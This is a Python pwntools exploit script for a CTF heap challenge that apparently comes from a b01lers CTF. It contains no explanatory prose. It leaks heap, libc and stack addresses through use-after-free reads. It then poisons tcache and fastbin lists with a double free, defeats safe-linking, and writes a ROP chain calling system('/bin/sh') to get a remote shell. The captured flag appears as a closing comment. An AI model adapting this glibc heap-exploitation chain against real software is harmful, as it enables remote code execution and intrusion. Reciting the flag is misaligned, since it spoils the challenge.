#!/usr/bin/python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x16AC

        c
        ''')
        input()


if args.REMOTE:
    p = remote('gold.b01le.rs', 4002)
else:
    p = process(exe.path)


def cr(idx, size=0x70):
    sla(b'-----Resize----', str(1))
    sla(b"? ", str(idx))
    sla(b"? ", str(size))


def de(idx):
    sla(b'-----Resize----', str(2))
    sla(b"? ", str(idx))


def vi(idx):
    sla(b'-----Resize----', str(3))
    sla(b"? ", str(idx))


def ed(idx, pa):
    sla(b'-----Resize----', str(4))
    sla(b"? ", str(idx))
    # sla(b"? ", str(size))
    sleep(1)
    sa(b'is', pa)


cr(0)
de(0)
vi(0)
heap = u64(p.recvline(keepends=False).ljust(8, b'\0')) << 12
info("heap: " + hex(heap))

cr(1, 0x500)
cr(0, 0x10)
de(1)
vi(1)
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x1d1cc0
info("libc.address: " + hex(libc.address))

for i in range(9):
    cr(i)
for i in range(7):
    de(i)
de(7)
de(8)
de(7)
for i in range(7):
    cr(i)
cr(7)
ed(7, flat(heap >> 12 ^ libc.sym.environ))
cr(8)
cr(8)
cr(8)
vi(8)
stack = u64(p.recv(6).ljust(8, b'\0')) 
info("stack: " + hex(stack))

target = stack - 0x150 - 8 -0x10
for i in range(10):
    cr(i, 0x50)
for i in range(8):
    de(i)
de(8)
de(9)
de(8)
GDB()

for i in range(7):
    cr(i, 0x50)
cr(7, 0x50)
ed(7, flat(heap >> 12 ^ target))
cr(8, 0x50)
cr(8, 0x50)
cr(8, 0x50)

pop_rdi = 0x000000000002aa82 + libc.address
ed(8, flat(stack,stack,stack,pop_rdi+1, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym.system))
# de()
# cr(0)
# cr(1)
# vi(1)
# stack = u64(p.recvline(keepends=False) + b'\0\0')
# info("libc.address " + hex(stack))
p.interactive()
# bctf{sm4ll_0v3rfl0w_1z_571ll_b4d_0k4y}